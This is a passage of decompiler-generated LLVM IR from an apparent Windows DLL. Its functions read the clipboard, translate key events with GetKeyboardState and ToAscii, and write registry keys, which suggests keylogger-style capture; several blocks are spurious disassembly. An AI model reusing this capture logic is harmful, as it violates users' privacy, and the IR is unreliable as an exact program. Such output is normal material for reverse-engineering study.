  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !708
  %6 = inttoptr i32 %3 to i32*, !insn.addr !708
  store i32 %5, i32* %6, align 4, !insn.addr !708
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !709
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !709
  %11 = add i8 %8, %10, !insn.addr !709
  %12 = inttoptr i32 %9 to i8*, !insn.addr !709
  store i8 %11, i8* %12, align 1, !insn.addr !709
  %13 = add i32 %1, 122, !insn.addr !710
  %14 = inttoptr i32 %13 to i8*, !insn.addr !710
  %15 = load i8, i8* %14, align 1, !insn.addr !710
  %16 = udiv i32 %4, 256, !insn.addr !710
  %17 = trunc i32 %16 to i8, !insn.addr !710
  %18 = add i8 %15, %17, !insn.addr !710
  store i8 %18, i8* %14, align 1, !insn.addr !710
  %19 = load i8, i8* %7, align 4, !insn.addr !711
  %20 = load i32, i32* %eax, align 4, !insn.addr !711
  %21 = trunc i32 %20 to i8, !insn.addr !711
  %22 = add i8 %19, %21, !insn.addr !711
  %23 = icmp eq i8 %22, 0, !insn.addr !711
  %24 = inttoptr i32 %20 to i8*, !insn.addr !711
  store i8 %22, i8* %24, align 1, !insn.addr !711
  %25 = trunc i32 %3 to i16, !insn.addr !712
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !712
  br i1 %23, label %26, label %dec_label_pc_405321, !insn.addr !713

; <label>:26:                                     ; preds = %dec_label_pc_405313
  %27 = call i32 @unknown_5398(), !insn.addr !713
  br label %dec_label_pc_405321, !insn.addr !713

dec_label_pc_405321:                              ; preds = %26, %dec_label_pc_405313
  %28 = icmp ult i8 %22, %19, !insn.addr !711
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !714
  store i32 %29, i32* %eax, align 4, !insn.addr !714
  br i1 %28, label %dec_label_pc_405389, label %dec_label_pc_405324, !insn.addr !715

dec_label_pc_405324:                              ; preds = %dec_label_pc_405321
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !716, !insn.addr !711
  %31 = and i8 %30, 1, !insn.addr !711
  %32 = icmp eq i8 %31, 0, !insn.addr !711
  %33 = trunc i32 %arg4 to i16, !insn.addr !717
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !717
  %35 = inttoptr i32 %2 to i32*, !insn.addr !717
  store i32 %34, i32* %35, align 4, !insn.addr !717
  br i1 %32, label %dec_label_pc_405384, label %dec_label_pc_405328, !insn.addr !718

dec_label_pc_405328:                              ; preds = %dec_label_pc_405324
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !719
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !720
  %36 = add i32 %arg4, 1, !insn.addr !721
  %37 = icmp eq i32 %36, 0, !insn.addr !721
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !722
  br i1 %37, label %dec_label_pc_40538f, label %dec_label_pc_40532e, !insn.addr !722

dec_label_pc_40532e:                              ; preds = %dec_label_pc_405328
  %38 = load i32, i32* %eax, align 4, !insn.addr !723
  %39 = add i32 %38, -1, !insn.addr !723
  store i32 %39, i32* %eax, align 4, !insn.addr !723
  %40 = trunc i32 %36 to i16, !insn.addr !724
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !724
  %42 = load i32, i32* %41, align 4, !insn.addr !724
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !724
  %43 = load i32, i32* %41, align 4, !insn.addr !725
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !725
  %44 = add i32 %arg7, 105, !insn.addr !726
  %45 = inttoptr i32 %44 to i8*, !insn.addr !726
  %46 = load i8, i8* %45, align 1, !insn.addr !726
  %47 = trunc i32 %39 to i8, !insn.addr !726
  %48 = add i8 %46, %47, !insn.addr !726
  %49 = icmp ult i8 %48, %46, !insn.addr !726
  store i8 %48, i8* %45, align 1, !insn.addr !726
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !727
  br i1 %49, label %dec_label_pc_4053af, label %dec_label_pc_40533c, !insn.addr !727

dec_label_pc_40533c:                              ; preds = %dec_label_pc_40532e
  %50 = icmp eq i8 %48, 0, !insn.addr !726
  br i1 %50, label %dec_label_pc_40535e, label %dec_label_pc_40533e, !insn.addr !728

dec_label_pc_40533e:                              ; preds = %dec_label_pc_40533c
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !729
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_4053af

dec_label_pc_40535e:                              ; preds = %dec_label_pc_40533c
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !730
  %53 = load i32, i32* %52, align 4, !insn.addr !730
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !730
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !731
  store i32 ptrtoint ([27 x i8]* @global_var_4053f4 to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !732
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !733
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !734
  %55 = add i32 %arg6, -8, !insn.addr !735
  %56 = inttoptr i32 %55 to i32*, !insn.addr !735
  store i32 0, i32* %56, align 4, !insn.addr !735
  %57 = add i32 %arg6, -12, !insn.addr !736
  %58 = inttoptr i32 %57 to i32*, !insn.addr !736
  store i32 1, i32* %58, align 4, !insn.addr !736
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !737
  ret i32 %57, !insn.addr !737

dec_label_pc_405384:                              ; preds = %dec_label_pc_405324
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !738

dec_label_pc_405389:                              ; preds = %dec_label_pc_405321
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !739
  %62 = add i8 %60, %61, !insn.addr !739
  %63 = inttoptr i32 %2 to i8*, !insn.addr !739
  store i8 %62, i8* %63, align 1, !insn.addr !739
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !740
  %65 = load i8, i8* %64, align 1, !insn.addr !740
  %66 = udiv i32 %arg3, 256, !insn.addr !740
  %67 = trunc i32 %66 to i8, !insn.addr !740
  %68 = add i8 %65, %67, !insn.addr !740
  store i8 %68, i8* %64, align 1, !insn.addr !740
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !740
  br label %dec_label_pc_40538f, !insn.addr !740

dec_label_pc_40538f:                              ; preds = %dec_label_pc_405389, %dec_label_pc_405328
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !741
  %70 = inttoptr i32 %69 to i32*, !insn.addr !741
  store i32 0, i32* %70, align 4, !insn.addr !741
  %71 = add i32 %esp.0, -8, !insn.addr !742
  %72 = inttoptr i32 %71 to i32*, !insn.addr !742
  store i32 0, i32* %72, align 4, !insn.addr !742
  %73 = add i32 %esp.0, -12, !insn.addr !743
  %74 = inttoptr i32 %73 to i32*, !insn.addr !743
  store i32 ptrtoint ([27 x i8]* @global_var_4053f4 to i32), i32* %74, align 4, !insn.addr !743
  %75 = add i32 %esp.0, -16, !insn.addr !744
  %76 = inttoptr i32 %75 to i32*, !insn.addr !744
  store i32 -2147483647, i32* %76, align 4, !insn.addr !744
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !745
  %78 = call i32 @function_4034f4(), !insn.addr !746
  %79 = add i32 %78, 1, !insn.addr !747
  %80 = add i32 %esp.0, -20, !insn.addr !748
  %81 = inttoptr i32 %80 to i32*, !insn.addr !748
  store i32 %79, i32* %81, align 4, !insn.addr !748
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !749
  br label %dec_label_pc_4053af, !insn.addr !749

dec_label_pc_4053af:                              ; preds = %dec_label_pc_40533e, %dec_label_pc_40538f, %dec_label_pc_40532e
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036f4(), !insn.addr !750
  %83 = add i32 %esp.1.reload, -4, !insn.addr !751
  %84 = inttoptr i32 %83 to i32*, !insn.addr !751
  store i32 %82, i32* %84, align 4, !insn.addr !751
  %85 = add i32 %esp.1.reload, -8, !insn.addr !752
  %86 = inttoptr i32 %85 to i32*, !insn.addr !752
  store i32 1, i32* %86, align 4, !insn.addr !752
  %87 = add i32 %esp.1.reload, -12, !insn.addr !753
  %88 = inttoptr i32 %87 to i32*, !insn.addr !753
  store i32 0, i32* %88, align 4, !insn.addr !753
  %89 = add i32 %esp.1.reload, -16, !insn.addr !754
  %90 = inttoptr i32 %89 to i32*, !insn.addr !754
  store i32 ptrtoint ([10 x i8]* @global_var_405410 to i32), i32* %90, align 4, !insn.addr !754
  %91 = add i32 %arg6, -8, !insn.addr !755
  %92 = inttoptr i32 %91 to i32*, !insn.addr !755
  %93 = load i32, i32* %92, align 4, !insn.addr !755
  %94 = add i32 %esp.1.reload, -20, !insn.addr !756
  %95 = inttoptr i32 %94 to i32*, !insn.addr !756
  store i32 %93, i32* %95, align 4, !insn.addr !756
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !757
  %97 = load i32, i32* %92, align 4, !insn.addr !758
  %98 = add i32 %esp.1.reload, -24, !insn.addr !759
  %99 = inttoptr i32 %98 to i32*, !insn.addr !759
  store i32 %97, i32* %99, align 4, !insn.addr !759
  %100 = call i32 @function_4043a0(), !insn.addr !760
  %101 = load i32, i32* %99, align 4, !insn.addr !761
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !762
  store i32 4215789, i32* %90, align 4, !insn.addr !763
  %102 = call i32 @"@LStrClr"(), !insn.addr !764
  ret i32 %102, !insn.addr !765
}

define i32 @function_4053e6() local_unnamed_addr {
dec_label_pc_4053e6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !766
  ret i32 %0, !insn.addr !766
}

define i32 @function_4053eb() local_unnamed_addr {
dec_label_pc_4053eb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !767
}

define i32 @function_4053ed() local_unnamed_addr {
dec_label_pc_4053ed:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !768
}

define i32 @function_4053f1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4053f1:
  %.reg2mem = alloca i32, !insn.addr !769
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !769
  %5 = inttoptr i32 %2 to i8*, !insn.addr !769
  store i8 %4, i8* %5, align 1, !insn.addr !769
  %6 = add i32 %0, 111, !insn.addr !770
  %7 = inttoptr i32 %6 to i8*, !insn.addr !770
  %8 = load i8, i8* %7, align 1, !insn.addr !770
  %9 = trunc i32 %1 to i8, !insn.addr !770
  %10 = add i8 %8, %9, !insn.addr !770
  %11 = icmp eq i8 %10, 0, !insn.addr !770
  store i8 %10, i8* %7, align 1, !insn.addr !770
  br i1 %11, label %12, label %dec_label_pc_4053f9, !insn.addr !771

; <label>:12:                                     ; preds = %dec_label_pc_4053f1
  %13 = call i32 @unknown_5470(), !insn.addr !771
  br label %dec_label_pc_4053f9, !insn.addr !771

dec_label_pc_4053f9:                              ; preds = %12, %dec_label_pc_4053f1
  %14 = icmp ult i8 %10, %8, !insn.addr !770
  br i1 %14, label %dec_label_pc_405461, label %dec_label_pc_4053fc, !insn.addr !772

dec_label_pc_4053fc:                              ; preds = %dec_label_pc_4053f9
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !716, !insn.addr !770
  %16 = and i8 %15, 1, !insn.addr !770
  %17 = icmp eq i8 %16, 0, !insn.addr !770
  %18 = trunc i32 %arg4 to i16, !insn.addr !773
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !773
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !773
  store i32 %19, i32* %20, align 4, !insn.addr !773
  br i1 %17, label %dec_label_pc_40545c, label %dec_label_pc_405400, !insn.addr !774

dec_label_pc_405400:                              ; preds = %dec_label_pc_4053fc
  %21 = add i32 %arg4, 1, !insn.addr !775
  %22 = icmp eq i32 %21, 0, !insn.addr !775
  store i32 %arg2, i32* %.reg2mem, !insn.addr !776
  br i1 %22, label %dec_label_pc_405467, label %dec_label_pc_405406, !insn.addr !776

dec_label_pc_405406:                              ; preds = %dec_label_pc_405400
  %23 = add i32 %arg2, -1, !insn.addr !777
  %24 = trunc i32 %21 to i16, !insn.addr !778
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !778
  %26 = load i32, i32* %25, align 4, !insn.addr !778
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !778
  %27 = load i32, i32* %25, align 4, !insn.addr !779
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !779
  %28 = add i32 %arg7, 105, !insn.addr !780
  %29 = inttoptr i32 %28 to i8*, !insn.addr !780
  %30 = load i8, i8* %29, align 1, !insn.addr !780
  %31 = trunc i32 %23 to i8, !insn.addr !780
  %32 = add i8 %30, %31, !insn.addr !780
  %33 = icmp eq i8 %32, 0, !insn.addr !780
  store i8 %32, i8* %29, align 1, !insn.addr !780
  br i1 %33, label %dec_label_pc_405436, label %dec_label_pc_405416, !insn.addr !781

dec_label_pc_405416:                              ; preds = %dec_label_pc_405406
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !782
  %34 = inttoptr i32 %23 to i8*, !insn.addr !783
  %35 = load i8, i8* %34, align 1, !insn.addr !783
  %36 = add i8 %35, %31, !insn.addr !783
  store i8 %36, i8* %34, align 1, !insn.addr !783
  %37 = add i32 %arg5, 86, !insn.addr !784
  %38 = inttoptr i32 %37 to i8*, !insn.addr !784
  %39 = load i8, i8* %38, align 1, !insn.addr !784
  %40 = trunc i32 %21 to i8, !insn.addr !784
  %41 = add i8 %39, %40, !insn.addr !784
  store i8 %41, i8* %38, align 1, !insn.addr !784
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !785
  %42 = call i32 @"@LStrClr"(), !insn.addr !786
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !787
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !788
  %44 = zext i1 %43 to i32, !insn.addr !789
  ret i32 %44, !insn.addr !789

dec_label_pc_405436:                              ; preds = %dec_label_pc_405406
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !790
  %46 = inttoptr i32 %45 to i8*, !insn.addr !790
  %47 = load i8, i8* %46, align 2, !insn.addr !790
  %48 = mul i8 %47, 2, !insn.addr !790
  store i8 %48, i8* %46, align 2, !insn.addr !790
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !791
  %50 = icmp eq i32* %49, null, !insn.addr !792
  br i1 %50, label %dec_label_pc_405461, label %dec_label_pc_405446, !insn.addr !793

dec_label_pc_405446:                              ; preds = %dec_label_pc_405436
  %51 = ptrtoint i32* %49 to i32, !insn.addr !791
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !794
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !795
  %53 = icmp eq i32* %52, null, !insn.addr !796
  br i1 %53, label %dec_label_pc_405461, label %dec_label_pc_405452, !insn.addr !797

dec_label_pc_405452:                              ; preds = %dec_label_pc_405446
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !798
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !799
  br label %dec_label_pc_40545c, !insn.addr !799

dec_label_pc_40545c:                              ; preds = %dec_label_pc_405452, %dec_label_pc_4053fc
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !800
  br label %dec_label_pc_405461, !insn.addr !800

dec_label_pc_405461:                              ; preds = %dec_label_pc_40545c, %dec_label_pc_405446, %dec_label_pc_405436, %dec_label_pc_4053f9
  %56 = call i1 @CloseClipboard(), !insn.addr !801
  %57 = sext i1 %56 to i32, !insn.addr !801
  store i32 %57, i32* %.reg2mem, !insn.addr !802
  br label %dec_label_pc_405467, !insn.addr !802

dec_label_pc_405467:                              ; preds = %dec_label_pc_405400, %dec_label_pc_405461
  %.reload = load i32, i32* %.reg2mem, !insn.addr !803
  ret i32 %.reload, !insn.addr !803
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_40546c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !804
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !804
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !805
  %4 = inttoptr i32 %3 to i32*, !insn.addr !806
  %5 = load i32, i32* %4, align 4, !insn.addr !806
  %6 = icmp eq i32 %5, 0, !insn.addr !806
  %7 = icmp eq i1 %6, false, !insn.addr !807
  %8 = icmp eq i1 %7, false, !insn.addr !808
  br i1 %8, label %dec_label_pc_4054a8, label %dec_label_pc_40547f, !insn.addr !808

dec_label_pc_40547f:                              ; preds = %dec_label_pc_40546c
  %9 = inttoptr i32 %0 to i8*, !insn.addr !809
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !810
  %11 = icmp eq i32* %10, null, !insn.addr !811
  %12 = icmp eq i1 %11, false, !insn.addr !812
  br i1 %12, label %dec_label_pc_4054a8, label %dec_label_pc_405492, !insn.addr !812

dec_label_pc_405492:                              ; preds = %dec_label_pc_40547f
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4222148 to i32*), i32 0, i32* null), !insn.addr !813
  br label %dec_label_pc_4054a8, !insn.addr !813

dec_label_pc_4054a8:                              ; preds = %dec_label_pc_405492, %dec_label_pc_40547f, %dec_label_pc_40546c
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !814
  store i32 0, i32* %15, align 4, !insn.addr !814
  ret i32 -2147221231, !insn.addr !815
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_4054d4:
  ret i32 0, !insn.addr !816
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_4054d8:
  ret i32 0, !insn.addr !817
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_4054dc:
  ret i32 0, !insn.addr !818
}

define i32 @function_4054e0() local_unnamed_addr {
dec_label_pc_4054e0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !819
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !819
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !819
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !820
  %2 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !821
  %3 = add i32 %2, 1, !insn.addr !821
  store i32 %3, i32* @global_var_4096b0, align 4, !insn.addr !821
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !822
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !823
  ret i32 0, !insn.addr !824
}

define i32 @function_405505() local_unnamed_addr {
dec_label_pc_405505:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !825
  ret i32 %0, !insn.addr !825
}

define i32 @function_40550a() local_unnamed_addr {
dec_label_pc_40550a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !826
}

define i32 @function_40550c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40550c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !827
}

define i32 @function_405510() local_unnamed_addr {
dec_label_pc_405510:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !828
  %2 = add i32 %1, -1, !insn.addr !828
  store i32 %2, i32* @global_var_4096b0, align 4, !insn.addr !828
  ret i32 %0, !insn.addr !829
}

define i32 @function_405518(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405518:
  %esp.0.reg2mem = alloca i32, !insn.addr !830
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !831
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !831
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !831
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !832
  %4 = call i32 @function_4077a8(), !insn.addr !833
  %5 = icmp ne i32 %4, 0, !insn.addr !834
  %6 = icmp eq i1 %5, false, !insn.addr !835
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !836
  br i1 %6, label %dec_label_pc_405613, label %dec_label_pc_405555, !insn.addr !836

dec_label_pc_405555:                              ; preds = %dec_label_pc_405518
  switch i32 %0, label %dec_label_pc_40559f [
    i32 8, label %dec_label_pc_405563
    i32 46, label %dec_label_pc_405582
  ]

dec_label_pc_405563:                              ; preds = %dec_label_pc_405555
  %7 = call i32 @function_407844(), !insn.addr !837
  %8 = call i32 @"@LStrDelete"(), !insn.addr !838
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !839
  br label %dec_label_pc_405613, !insn.addr !839

dec_label_pc_405582:                              ; preds = %dec_label_pc_405555
  %9 = call i32 @function_407844(), !insn.addr !840
  %10 = call i32 @"@LStrDelete"(), !insn.addr !841
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !842
  br label %dec_label_pc_405613, !insn.addr !842

dec_label_pc_40559f:                              ; preds = %dec_label_pc_405555
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !843
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !844
  %14 = udiv i32 %1, 65536, !insn.addr !845
  %15 = and i32 %14, 255, !insn.addr !846
  %16 = inttoptr i32 %15 to i16*, !insn.addr !847
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !848
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !849
  %19 = icmp eq i32 %18, 1, !insn.addr !850
  %20 = icmp eq i1 %19, false, !insn.addr !851
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !851
  br i1 %20, label %dec_label_pc_405613, label %dec_label_pc_4055cb, !insn.addr !851

dec_label_pc_4055cb:                              ; preds = %dec_label_pc_40559f
  %21 = call i32 @function_40750c(), !insn.addr !852
  %22 = icmp eq i32 %21, 0, !insn.addr !853
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !854
  br i1 %22, label %dec_label_pc_405613, label %dec_label_pc_4055d7, !insn.addr !854

dec_label_pc_4055d7:                              ; preds = %dec_label_pc_4055cb
  %23 = call i32 @function_4034f4(), !insn.addr !855
  %24 = icmp sgt i32 %23, 15, !insn.addr !856
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !856
  br i1 %24, label %dec_label_pc_405613, label %dec_label_pc_4055e8, !insn.addr !856

dec_label_pc_4055e8:                              ; preds = %dec_label_pc_4055d7
  %25 = call i32 @function_407844(), !insn.addr !857
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !858
  %27 = call i32 @"@LStrInsert"(), !insn.addr !859
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !859
  br label %dec_label_pc_405613, !insn.addr !859

dec_label_pc_405613:                              ; preds = %dec_label_pc_4055e8, %dec_label_pc_4055d7, %dec_label_pc_4055cb, %dec_label_pc_40559f, %dec_label_pc_405582, %dec_label_pc_405563, %dec_label_pc_405518
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !860
  %29 = load i32, i32* %28, align 4, !insn.addr !860
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !861
  %30 = add i32 %esp.0.reload, 8, !insn.addr !862
  %31 = inttoptr i32 %30 to i32*, !insn.addr !862
  store i32 4216371, i32* %31, align 4, !insn.addr !862
  %32 = call i32 @"@LStrClr"(), !insn.addr !863
  ret i32 %32, !insn.addr !864
}

define i32 @function_40562c() local_unnamed_addr {
dec_label_pc_40562c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !865
  ret i32 %0, !insn.addr !865
}

define i32 @function_405631() local_unnamed_addr {
dec_label_pc_405631:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !866
}

define i32 @function_405633(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405633:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !867
}

define i32 @function_40563c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40563c:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !868
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !868
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !868
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !869
  %2 = call i32 @function_4077a8(), !insn.addr !870
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !871
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !872
  %4 = add i32 %1, 8, !insn.addr !873
  %5 = inttoptr i32 %4 to i32*, !insn.addr !873
  store i32 4216578, i32* %5, align 4, !insn.addr !873
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !874
  ret i32 %6, !insn.addr !875
}

define i32 @function_4056fb() local_unnamed_addr {
dec_label_pc_4056fb:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !876
  ret i32 %0, !insn.addr !876
}

define i32 @function_405700() local_unnamed_addr {
dec_label_pc_405700:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !877
}

define i32 @function_405702(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405702:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !878
}

define i32 @function_405708(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405708:
  %esp.0.reg2mem = alloca i32, !insn.addr !879
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !880
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !880
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !880
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !881
  %3 = call i32 @function_407718(), !insn.addr !882
  %4 = icmp eq i32 %3, 0, !insn.addr !883
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !884
  br i1 %4, label %dec_label_pc_40576c, label %dec_label_pc_405729, !insn.addr !884

dec_label_pc_405729:                              ; preds = %dec_label_pc_405708
  %5 = inttoptr i32 %0 to i8*, !insn.addr !885
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405790 to i32*), i8* null, i8* %5), !insn.addr !886
  %7 = ptrtoint i32* %6 to i32, !insn.addr !886
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !887
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !887
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !888
  %10 = icmp eq i1 %9, false, !insn.addr !889
  br i1 %10, label %dec_label_pc_405767, label %dec_label_pc_405744, !insn.addr !890

dec_label_pc_405744:                              ; preds = %dec_label_pc_405729
  %11 = call i32 @function_407578(), !insn.addr !891
  %12 = call i32 @"@LStrAsg"(), !insn.addr !892
  %13 = call i32 @function_4078a0(), !insn.addr !893
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !894
  br label %dec_label_pc_40576c, !insn.addr !894

dec_label_pc_405767:                              ; preds = %dec_label_pc_405729
  %14 = call i32 @function_4079d4(), !insn.addr !895
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !895
